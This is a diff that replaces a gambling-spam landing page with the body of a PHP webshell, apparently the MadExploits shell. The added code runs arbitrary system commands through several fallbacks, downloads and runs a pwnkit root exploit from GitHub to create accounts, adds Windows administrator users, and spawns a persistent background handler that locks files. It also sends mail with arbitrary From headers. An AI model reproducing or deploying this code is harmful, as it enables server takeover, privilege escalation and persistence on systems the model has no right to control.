+        $chFiles = $fungsi[30](unx($_GET['ch']), $_POST['chFile']);
+        if ($chFiles) {
+            success();
+        } else {
+            failed();
+        }
+    } else if (isset($_POST['add-username']) && isset($_POST['add-password'])) {
+        if (!$fungsi[3]('pwnkit')) {
+            cmd('wget https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit -O pwnkit');
+            cmd('chmod +x pwnkit');
+            cmd('./pwnkit "id" > .mad-root');
+            echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&rooting=True">';
+        } else if ($fungsi[3]('.mad-root')) {
+            $response = $fungsi[11]('.mad-root');
+            $r_text = explode(" ", $response);
+            if ($r_text[0] == "uid=0(root)") {
+                $username = $_POST['add-username'];
+                $password = $_POST['add-password'];
+                cmd('./pwnkit "useradd ' . $username . ' ; echo -e "' . $password . '\n' . $password . '" | passwd ' . $username . '"');
+            } else {
+                echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&adduser=failed">';
+            }
+        }
+    } else if ($_POST['lockfile'] == true) {
+        $flesName = $_POST['lockfile'];
+        $TmpNames = $fungsi[31]();
+        if (file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler')) && file_exists($TmpNames . '/.sessions/.' . remove_dot($flesName) . '-text')) {
+            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-text-file'));
+            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler'));
+        }
+        mkdir($TmpNames . "/.sessions");
+        cmd("cp $flesName " . $TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-text-file'));
+        cmd("chmod 444 " . $flesName);
+        $handler = '
+<?php
+@ini_set("max_execution_time", 0);
+while (True){
+    if (!file_exists("' . $fungsi[0]() . '")){
+        mkdir("' . $fungsi[0]() . '");
+    }
+    if (!file_exists("' . $fungsi[0]() . '/' . $flesName . '")){
+        $text = ' . $fungsi[33] . '(file_get_contents("' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-text-file') . '"));
+        file_put_contents("' . $fungsi[0]() . '/' . $flesName . '", ' . $fungsi[32] . '($text));
+    }
+    if (gecko_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
+        chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
+    } 
+    if (gecko_perm("' . $fungsi[0]() . '") != 0555){
+        chmod("' . $fungsi[0]() . '", 0555);
+    }
+}
+
+function gecko_perm($flename){
+    return substr(sprintf("%o", fileperms($flename)), -4);
+}
+';
+        $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler') . "", $handler);
+        if ($hndlers) {
+            cmd(PHP_BINARY . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler') . ' > /dev/null 2>/dev/null &');
+            success();
+        } else {
+            failed();
+        }
+    } else if ($_POST['add-rdp'] == True) {
+        $userRDP = $_POST['add-rdp'];
+        $passRDP = $_POST['add-rdp-pass'];
+        if (stristr(PHP_OS, "WIN")) {
+            $procRDP = cmd("net user " . $userRDP . " " . $passRDP . " /add");
+            if ($procRDP) {
+                cmd("net localgroup administrators " . $userRDP . " /add");
+                success();
+            } else {
+                failed();
+            }
+        } else {
+            failed();
+        }
+    } else if ($_POST['mail-from-smtp'] == True) {
+        $emailFrom = $_POST['mail-from-smtp'];
+        $emailTo = $_POST['mail-to-smtp'];
+        $emailSubject = $_POST['mailto-subject'];
+        $messageMail = $_POST['message-smtp'];
+        $headersMail = 'From: ' . $emailFrom . '' . "\r\n" .
+            'Reply-To: ' . $emailFrom . '' . "\r\n" .
+            'X-Mailer: PHP/' . phpversion();
+        $procMailSmTp = mail($emailTo, $emailSubject, $messageMail, $headersMail);
+        if ($procMailSmTp) {
+            success();
+        } else {
+            failed();
+        }
+    }
+}
+
+if ($_GET['response'] == "success") {
+    echo "<script>
+Swal.fire({
+    icon: 'success',
+    title: 'Sucesss...',
+    text: 'Done Success!',
+    confirmButtonColor: '#22242d',
+})</script>";
+} else if ($_GET['response'] == "failed") {
+    echo "<script>
+Swal.fire({
+    icon: 'error',
+    title: 'Failed...',
+    text: 'Something wrong!',
+    confirmButtonColor: '#22242d',
+})
+    </script>";
+}
+
+
+function success()
+{
+    echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '&response=success">';
+}
+function failed()
+{
+    echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '&response=failed">';
+}
+
+function formatSize($bytes)
+{
+    $types = array('<span class="file-size">B</span>', '<span class="file-size">KB</span>', '<span class="file-size">MB</span>', '<span class="file-size">GB</span>', '<span class="file-size">TB</span>');
+    for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++);
+    return (round($bytes, 2) . " " . $types[$i]);
+}
+
+
+function hx($n)
+{
+    $y = '';
+    for ($i = 0; $i < strlen($n); $i++) {
+        $y .= dechex(ord($n[$i]));
+    }
+    return $y;
+}
+function unx($y)
+{
+    $n = '';
+    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
+        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
+    }
+    return $n;
+}
+
+function suggest_exploit()
+{
+    $uname = $GLOBALS['fungsi'][8]();
+    $xplod = explode(" ", $uname);
+    $xpld = explode("-", $xplod[2]);
+    $pl = explode(".", $xpld[0]);
+    return $pl[0] . "." . $pl[1] . "." . $pl[2];
+}
+function s()
+{
+    $d0mains = @$GLOBALS['fungsi'][7]("/etc/named.conf", false);
+    if (!$d0mains) {
+        $dom = "<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";
+        $GLOBALS["need_to_update_header"] = "true";
+    } else {
+        $count = 0;
+        foreach ($d0mains as $d0main) {
+            if (@strstr($d0main, "zone")) {
+                preg_match_all('#zone "(.*)"#', $d0main, $domains);
+                flush();
+                if (strlen(trim($domains[1][0])) > 2) {
+                    flush();
+                    $count++;
+                }
+            }
+        }
+        $dom = "$count Domain";
+    }
+    return $dom;
+}
+
+function cmd($in, $re = false)
+{
+    $out = '';
+    try {
+        if ($re) $in = $in . " 2>&1";
+        if (function_exists("\x65\x78\x65\x63")) {
+            @$GLOBALS['fungsi'][16]($in, $out);
+            $out = @join("\n", $out);
+        } elseif (function_exists("\x70\x61\x73\x73\x74\x68\x72\x75")) {
+            ob_start();
+            @$GLOBALS['fungsi'][17]($in);
+            $out = ob_get_clean();
+        } elseif (function_exists("\x73\x79\x73\x74\x65\x6d")) {
+            ob_start();
+            @$GLOBALS['fungsi'][18]($in);
+            $out = ob_get_clean();
+        } elseif (function_exists("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) {
+            $out = $GLOBALS['fungsi'][19]($in);
+        } elseif (function_exists("\x70\x6f\x70\x65\x6e") && function_exists("\x70\x63\x6c\x6f\x73\x65")) {
+            if (is_resource($f = @$GLOBALS['fungsi'][20]($in, "r"))) {
+                $out = "";
+                while (!@feof($f))
+                    $out .= fread($f, 1024);
+                $GLOBALS['fungsi'][21]($f);
+            }
+        } elseif (function_exists("\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e")) {
+            $pipes = array();
+            $process = @$GLOBALS['fungsi'][23]($in . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
+            $out = @$GLOBALS['fungsi'][22]($pipes[1]);
+        } elseif (class_exists('COM')) {
+            $alfaWs = new COM('WScript.shell');
+            $e = $alfaWs->$GLOBALS['fungsi'][16]('cmd.exe /c ' . $_POST['alfa1']);
+            $stdout = $e->StdOut();
+            $out = $stdout->ReadAll();
+        }
+    } catch (Exception $e) {
+    }
+    return $out;
+}
+
+
+function winpwd()
+{
+    return str_replace("\\", "/", $GLOBALS['fungsi'][0]());
+}
+
+function compressToZip($sourceFile, $zipFilename)
+{
+    $zip = new ZipArchive();
+
+    if ($zip->open($zipFilename, ZipArchive::CREATE) === TRUE) {
+        $zip->addFile($sourceFile, basename($sourceFile));
+        $zip->close();
+        success();
+    } else {
+        failed();
+    }
+}
+
+function remove_slash($val)
+{
+    $tex = str_replace("/", "", $val);
+    $tex1 = str_replace(":", "", $tex);
+    $tex2 = str_replace("_", "", $tex1);
+    $tex3 = str_replace(" ", "", $tex2);
+    $tex4 = str_replace(".", "", $tex3);
+    return $tex4;
+}
+
+function unlinkDir($dir)
+{
+    $dirs = array($dir);
+    $files = array();
+    for ($i = 0;; $i++) {
+        if (isset($dirs[$i]))
+            $dir =  $dirs[$i];
+        else
+            break;
+
+        if ($openDir = opendir($dir)) {
+            while ($readDir = @readdir($openDir)) {
+                if ($readDir != "." && $readDir != "..") {
+
+                    if ($GLOBALS['fungsi'][2]($dir . "/" . $readDir)) {
+                        $dirs[] = $dir . "/" . $readDir;
+                    } else {
+
+                        $files[] = $dir . "/" . $readDir;
+                    }
+                }
+            }
+        }
+    }
+
+
+
+    foreach ($files as $file) {
+        $GLOBALS['fungsi'][24]($file);
+    }
+    $dirs = array_reverse($dirs);
+    foreach ($dirs as $dir) {
+        $GLOBALS['fungsi'][25]($dir);
+    }
+}
+
+function remove_dot($file)
+{
+    $FILES = $file;
+    $pch = explode(".", $FILES);
+    return $pch[0];
+}
+
+
+function windowsDriver()
+{
+    $winArr = [
+        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'X', 'Y', 'Z'
+    ];
+    foreach ($winArr as $winNum => $winVal) {
+        if (is_dir($winVal . ":/")) {
+            echo "<a style='color:orange; font-weight:bold;' href='?d=" . hx($winVal . ":/") . "'>[ " . $winVal . " ] </a>&nbsp;";
+        }
+    }
+}
+
+function namaPanjang($value)
+{
+    $namaNya = $value;
+    $extensi = pathinfo($value, PATHINFO_EXTENSION);
+    if (strlen($namaNya) > 30) {
+        return substr($namaNya, 0, 30) . "...";
+    } else {
+        return $value;
+    }
+}
+
+function extractArchive($archiveFilename, $extractPath)
+{
+    $zip = new ZipArchive();
+
+    if ($zip->open($archiveFilename) === TRUE) {
+        $zip->extractTo($extractPath);
+        $zip->close();
+        return true;
+    } else {
+        return false;
+    }
+}
+
+function perms($file)
+{
+    $perms = $GLOBALS['fungsi'][6]($file);
+    if (($perms & 0xC000) == 0xC000) {
+        // Socket
+        $info = 's';
+    } elseif (($perms & 0xA000) == 0xA000) {
+        // Symbolic Link
+        $info = 'l';
+    } elseif (($perms & 0x8000) == 0x8000) {
+        // Regular
+        $info = '-';
+    } elseif (($perms & 0x6000) == 0x6000) {
+        // Block special
+        $info = 'b';
+    } elseif (($perms & 0x4000) == 0x4000) {
+        // Directory
+        $info = 'd';
+    } elseif (($perms & 0x2000) == 0x2000) {
+        // Character special
+        $info = 'c';
+    } elseif (($perms & 0x1000) == 0x1000) {
+        // FIFO pipe
+        $info = 'p';
+    } else {
+        // Unknown
+        $info = 'u';
+    }
+    // Owner
+    $info .= (($perms & 0x0100) ? 'r' : '-');
+    $info .= (($perms & 0x0080) ? 'w' : '-');
+    $info .= (($perms & 0x0040) ?
+        (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
+    // Group
+    $info .= (($perms & 0x0020) ? 'r' : '-');
+    $info .= (($perms & 0x0010) ? 'w' : '-');
+    $info .= (($perms & 0x0008) ?
+        (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
+
+    // World
+    $info .= (($perms & 0x0004) ? 'r' : '-');
+    $info .= (($perms & 0x0002) ? 'w' : '-');
+    $info .= (($perms & 0x0001) ?
+        (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
+    return $info;
+}
 ?>
-
-<!-- Script Landing Page -->
- <!doctype html>
-<html xmlns:og="http://opengraphprotocol.org/schema/" xmlns:fb="http://www.facebook.com/2008/fbml" lang="en-US"  >
-  <head>
-    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
-    <meta name="viewport" content="width=device-width, initial-scale=1">
-    <!-- This is Squarespace. -->
-<base href="<?php echo $urlPath ?>">
-<meta charset="utf-8" />
-<title><?php echo $BRANDS ?> : Platform Slot Gacor Bet200 Dari Server Thailand Pasti Maxwin</title>
-<meta http-equiv="Accept-CH" content="Sec-CH-UA-Platform-Version, Sec-CH-UA-Model" /><link rel="icon" type="image/x-icon" media="(prefers-color-scheme: light)" href="https://pub-eec1197bebac4db3a9076a8d8c4d15a0.r2.dev/huu.png?format=100w"/>
-<link rel="icon" type="image/x-icon" media="(prefers-color-scheme: dark)" href="https://pub-eec1197bebac4db3a9076a8d8c4d15a0.r2.dev/huu.png?format=100w"/>
-<link rel="canonical" href="<?php echo $urlPath ?>"/>
-<link rel="amphtml" href="https://pub-913f7f21c7a049c78b0fab16f603a7c3.r2.dev/<?php echo $BRANDS ?>.html"/>
-<meta property="og:site_name" content="<?php echo $BRANDS ?>"/>
-<meta property="og:title" content="<?php echo $BRANDS ?> : Platform Slot Gacor Bet200 Dari Server Thailand Pasti Maxwin"/>
-<meta property="og:url" content="<?php echo $urlPath ?>"/>
-<meta property="og:type" content="website"/>
-<meta property="og:description" content="Selamat datang di <?php echo $BRANDS ?> ,Platform permainan game online terbaru server Thailand yang sensasional dengan proses termudah dan cepat. Daftar & Login sekarang di Link Resmi dijamin pasti maxwin dengan bet 200 perak saja."/>
-<meta property="og:image" content="https://pub-eec1197bebac4db3a9076a8d8c4d15a0.r2.dev/aigirl1024.jpg?format=1500w"/>
-<meta property="og:image:width" content="1120"/>
-<meta property="og:image:height" content="400"/>
-<meta itemprop="name" content="<?php echo $BRANDS ?> : Platform Slot Gacor Bet200 Dari Server Thailand Pasti Maxwin"/>
-<meta itemprop="url" content="<?php echo $urlPath ?>"/>
-<meta itemprop="description" content="Selamat datang di <?php echo $BRANDS ?> ,Platform permainan game online terbaru server Thailand yang sensasional dengan proses termudah dan cepat. Daftar & Login sekarang di Link Resmi dijamin pasti maxwin dengan bet 200 perak saja."/>
-<meta itemprop="thumbnailUrl" content="https://pub-eec1197bebac4db3a9076a8d8c4d15a0.r2.dev/aigirl1024.jpg?format=1500w"/>
-<link rel="image_src" href="https://pub-eec1197bebac4db3a9076a8d8c4d15a0.r2.dev/aigirl1024.jpg?format=1500w" />
-<meta itemprop="image" content="https://pub-eec1197bebac4db3a9076a8d8c4d15a0.r2.dev/aigirl1024.jpg?format=1500w"/>
-<meta name="twitter:title" content="<?php echo $BRANDS ?> : Platform Slot Gacor Bet200 Dari Server Thailand Pasti Maxwin"/>
-<meta name="twitter:image" content="https://pub-eec1197bebac4db3a9076a8d8c4d15a0.r2.dev/aigirl1024.jpg?format=1500w"/>
-<meta name="twitter:url" content="<?php echo $urlPath ?>"/>
-<meta name="twitter:card" content="summary"/>
-<meta name="twitter:description" content="Selamat datang di <?php echo $BRANDS ?> ,Platform permainan game online terbaru server Thailand yang sensasional dengan proses termudah dan cepat. Daftar & Login sekarang di Link Resmi dijamin pasti maxwin dengan bet 200 perak saja."/>
-<meta name="description" content="Selamat datang di <?php echo $BRANDS ?> , dimana situs permainan online terbaru yang 
-menghadirkan permainan terlengkap dengan cara proses yang mudah dan cepat. 
-Daftar dan rasakan keseruan bermain di sini sekarang juga." />
-<link rel="preconnect" href="https://images.squarespace-cdn.com">
-<script type="text/javascript" src="//use.typekit.net/ik/Gmpnq-baesH34YE3RPQwn3MiMc2jdhWvDsyZflJUia9fen6gfFHN4UJLFRbh52jhWDjhjAIUZQj3FRsRFcmKwQMoZQqtwAjD5sGMJyFcScB0-hUTdKu1dasG-AwliW4aJy8GiabljAmXdcIlZWyXScIljhN0Zem0ShmqH6qJ_hwbMg62JMJ7fbR3jUMMeMb6MKG4fVBRIMMjgPMfH6qJvcwbMg6YJMJ7f6KYN3IbMg6FJMJ7fbRXjUMMeMt6MKG4fVZRIMMjIPMfH6GJvdqfIMIjgfMfqMYyzHKug6.js"></script>
-<script type="text/javascript">try{Typekit.load();}catch(e){}</script>
-<script type="text/javascript" crossorigin="anonymous" defer="defer" nomodule="nomodule" src="//assets.squarespace.com/@sqs/polyfiller/1.6/legacy.js"></script>
-<script type="text/javascript" crossorigin="anonymous" defer="defer" src="//assets.squarespace.com/@sqs/polyfiller/1.6/modern.js"></script>
-<script type="text/javascript">SQUARESPACE_ROLLUPS = {};</script>
-<script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/extract-css-runtime-4210df4470f355b94a4a-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-extract_css_runtime');</script>
-<script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/extract-css-runtime-4210df4470f355b94a4a-min.en-US.js" defer ></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/extract-css-moment-js-vendor-dfbb72c875564c27a00c-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-extract_css_moment_js_vendor');</script>
-<script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/extract-css-moment-js-vendor-dfbb72c875564c27a00c-min.en-US.js" defer ></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/cldr-resource-pack-15305921bb94c505cd92-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-cldr_resource_pack');</script>
-<script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/cldr-resource-pack-15305921bb94c505cd92-min.en-US.js" defer ></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-vendors-stable-0f51b06fac4ba1f7c845-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-common_vendors_stable');</script>
-<script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/common-vendors-stable-0f51b06fac4ba1f7c845-min.en-US.js" defer ></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-vendors-e368c46dc84af7aeeed2-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-common_vendors');</script>
-<script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/common-vendors-e368c46dc84af7aeeed2-min.en-US.js" defer ></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/common-b6cc620cda9f53ff8266-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-common');</script>
-<script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/common-b6cc620cda9f53ff8266-min.en-US.js" defer ></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/commerce-d485d60652dbe0e4ac9b-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-commerce');</script>
-<script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/commerce-d485d60652dbe0e4ac9b-min.en-US.js" defer ></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].css = ["//assets.squarespace.com/universal/styles-compressed/commerce-2af06f7948db5477d8f5-min.en-US.css"]; })(SQUARESPACE_ROLLUPS, 'squarespace-commerce');</script>
-<link rel="stylesheet" type="text/css" href="//assets.squarespace.com/universal/styles-compressed/commerce-2af06f7948db5477d8f5-min.en-US.css"><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/user-account-core-d350cb2260fa1a3f425c-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-user_account_core');</script>
-<script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/user-account-core-d350cb2260fa1a3f425c-min.en-US.js" defer ></script><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].css = ["//assets.squarespace.com/universal/styles-compressed/user-account-core-e84acd73aa5ee3fcd4ad-min.en-US.css"]; })(SQUARESPACE_ROLLUPS, 'squarespace-user_account_core');</script>
-<link rel="stylesheet" type="text/css" href="//assets.squarespace.com/universal/styles-compressed/user-account-core-e84acd73aa5ee3fcd4ad-min.en-US.css"><script>(function(rollups, name) { if (!rollups[name]) { rollups[name] = {}; } rollups[name].js = ["//assets.squarespace.com/universal/scripts-compressed/performance-52d31862402d449695d0-min.en-US.js"]; })(SQUARESPACE_ROLLUPS, 'squarespace-performance');</script>
-<script crossorigin="anonymous" src="//assets.squarespace.com/universal/scripts-compressed/performance-52d31862402d449695d0-min.en-US.js" defer ></script><script data-name="static-context">Static = window.Static || {}; Static.SQUARESPACE_CONTEXT = {"betaFeatureFlags":["commerce_subscription_renewal_notifications","donations_refresh","marketing_landing_page","visitor_react_forms","hideable_header_footer_for_videos","is_feature_gate_refresh_enabled","pdp_description_add_to_cart_tweaks","customer_account_creation_recaptcha","i18n_beta_website_locales","commerce_paywall_renewal_notifications","crm_product_contacts_use_mfe","hide_header_footer_beta","member_areas_feature","fluid_engine_clean_up_grid_contextual_change","blueprint_content_replacement","themes","unify_edit_mode_p2","hideable_header_footer","commerce_order_status_access","enable_css_variable_tweaks","accounting_orders_sync","campaigns_discount_section_in_blasts","background_art_onboarding","override_block_styles","crm_redesign_phase_1","gdpr_cookie_banner","collection_typename_switching","scripts_defer","nested_categories","supports_versioned_template_assets","hideable_header_footer_for_courses","campaigns_thumbnail_layout","commerce_site_visitor_metrics","emit_donation_events_to_census","campaigns_new_image_layout_picker","customer_accounts_email_verification","nested_categories_migration_enabled","commerce_clearpay","campaigns_global_uc_ab","fluid_engine","campaigns_discount_section_in_automations","donations_refresh_in_circle_labs","pages_panel_v3_search_bar","send_local_pickup_ready_email","new_stacked_index","campaigns_import_discounts","rewrite_transactional_email_from_address","toggle_preview_new_shortcut","hideable_header_footer_for_memberareas"],"videoAssetsFeatureFlags":["mux-data-video-collection","mux-data-video-block","mux-data-course-collection"],"facebookAppId":"314192535267336","facebookApiVersion":"v6.0","rollups":{"squarespace-announcement-bar":{"js":"//assets.squarespace.com/universal/scripts-compressed/announcement-bar-82a55d2bcacd1fa1d3ec-min.en-US.js"},"squarespace-audio-player":{"css":"//assets.squarespace.com/universal/styles-compressed/audio-player-9fb16b1675c0ff315dae-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/audio-player-f5c55f1c852399cb5ca0-min.en-US.js"},"squarespace-blog-collection-list":{"css":"//assets.squarespace.com/universal/styles-compressed/blog-collection-list-0106e2d3707028a62a85-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/blog-collection-list-f179daf3c110a4b83377-min.en-US.js"},"squarespace-calendar-block-renderer":{"css":"//assets.squarespace.com/universal/styles-compressed/calendar-block-renderer-0e361398b7723c9dc63e-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/calendar-block-renderer-becb4ac66ce529be2bdc-min.en-US.js"},"squarespace-chartjs-helpers":{"css":"//assets.squarespace.com/universal/styles-compressed/chartjs-helpers-e1c09c17d776634c0edc-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/chartjs-helpers-da52ff1571e0aca1e1c5-min.en-US.js"},"squarespace-comments":{"css":"//assets.squarespace.com/universal/styles-compressed/comments-24b74a0326eae0cd5049-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/comments-5e6a7333ea4d40e04922-min.en-US.js"},"squarespace-custom-css-popup":{"css":"//assets.squarespace.com/universal/styles-compressed/custom-css-popup-756a3a56dc313fcb2166-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/custom-css-popup-a085034c7570f39d7bcb-min.en-US.js"},"squarespace-dialog":{"css":"//assets.squarespace.com/universal/styles-compressed/dialog-022a509a6f13530f6856-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/dialog-98b562413f8c07f90a8c-min.en-US.js"},"squarespace-events-collection":{"css":"//assets.squarespace.com/universal/styles-compressed/events-collection-0e361398b7723c9dc63e-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/events-collection-67c0d3276878656310bc-min.en-US.js"},"squarespace-form-rendering-utils":{"js":"//assets.squarespace.com/universal/scripts-compressed/form-rendering-utils-8c5d1fb1c57ddf999d70-min.en-US.js"},"squarespace-forms":{"css":"//assets.squarespace.com/universal/styles-compressed/forms-8d93ba2c12ff0765b64c-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/forms-7f1fadf0be4417ff4504-min.en-US.js"},"squarespace-gallery-collection-list":{"css":"//assets.squarespace.com/universal/styles-compressed/gallery-collection-list-0106e2d3707028a62a85-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/gallery-collection-list-98da2f72755541dab245-min.en-US.js"},"squarespace-image-zoom":{"css":"//assets.squarespace.com/universal/styles-compressed/image-zoom-0106e2d3707028a62a85-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/image-zoom-80da18540c2c91f06baf-min.en-US.js"},"squarespace-pinterest":{"css":"//assets.squarespace.com/universal/styles-compressed/pinterest-0106e2d3707028a62a85-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/pinterest-754236289c5ba28792cc-min.en-US.js"},"squarespace-popup-overlay":{"css":"//assets.squarespace.com/universal/styles-compressed/popup-overlay-b2bf7df4402e207cd72c-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/popup-overlay-1040c28e01fc21272447-min.en-US.js"},"squarespace-product-quick-view":{"css":"//assets.squarespace.com/universal/styles-compressed/product-quick-view-4aec27f1bd826750e9db-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/product-quick-view-8bf8f9dc3b612e3bdc45-min.en-US.js"},"squarespace-products-collection-item-v2":{"css":"//assets.squarespace.com/universal/styles-compressed/products-collection-item-v2-0106e2d3707028a62a85-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/products-collection-item-v2-d76e0cec0cbd95d2fdfd-min.en-US.js"},"squarespace-products-collection-list-v2":{"css":"//assets.squarespace.com/universal/styles-compressed/products-collection-list-v2-0106e2d3707028a62a85-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/products-collection-list-v2-be13450cfd6ff4aa937e-min.en-US.js"},"squarespace-search-page":{"css":"//assets.squarespace.com/universal/styles-compressed/search-page-dcc0462e30efbd6dc562-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/search-page-fa32cb968d52feb3e4f9-min.en-US.js"},"squarespace-search-preview":{"js":"//assets.squarespace.com/universal/scripts-compressed/search-preview-fb8220341d13fe06a50f-min.en-US.js"},"squarespace-simple-liking":{"css":"//assets.squarespace.com/universal/styles-compressed/simple-liking-a9eb87c1b73b199ce387-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/simple-liking-3c5936ee7186988153f2-min.en-US.js"},"squarespace-social-buttons":{"css":"//assets.squarespace.com/universal/styles-compressed/social-buttons-98ee3a678d356d849b76-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/social-buttons-18d01aeb237c8b65741d-min.en-US.js"},"squarespace-tourdates":{"css":"//assets.squarespace.com/universal/styles-compressed/tourdates-0106e2d3707028a62a85-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/tourdates-705763b908fbffcb73e4-min.en-US.js"},"squarespace-website-overlays-manager":{"css":"//assets.squarespace.com/universal/styles-compressed/website-overlays-manager-6dfb472f441e39d78b13-min.en-US.css","js":"//assets.squarespace.com/universal/scripts-compressed/website-overlays-manager-e58dcc4f26c163de34e5-min.en-US.js"}},"pageType":2,"website":{"id":"66aa1e6064c6eb109e981f39","identifier":"disc-ranunculus-j839","websiteType":1,"contentModifiedOn":1722424958227,"cloneable":false,"hasBeenCloneable":false,"siteStatus":{},"language":"en-US","timeZone":"Asia/Phnom_Penh","machineTimeZoneOffset":25200000,"timeZoneOffset":25200000,"timeZoneAbbr":"ICT","siteTitle":"<?php echo $BRANDS ?>","fullSiteTitle":"<?php echo $BRANDS ?> : Platform Slot Gacor Bet200 Dari Server Thailand Pasti Maxwin","siteDescription":"","location":{},"logoImageId":"66aa20076e767717d131ca5a","shareButtonOptions":{"8":true,"3":true,"1":true,"7":true,"6":true,"4":true,"2":true},"logoImageUrl":"https://pub-eec1197bebac4db3a9076a8d8c4d15a0.r2.dev/aigirl1024.jpg","authenticUrl":"<?php echo $urlPath ?>","internalUrl":"<?php echo $urlPath ?>","baseUrl":"<?php echo $urlPath 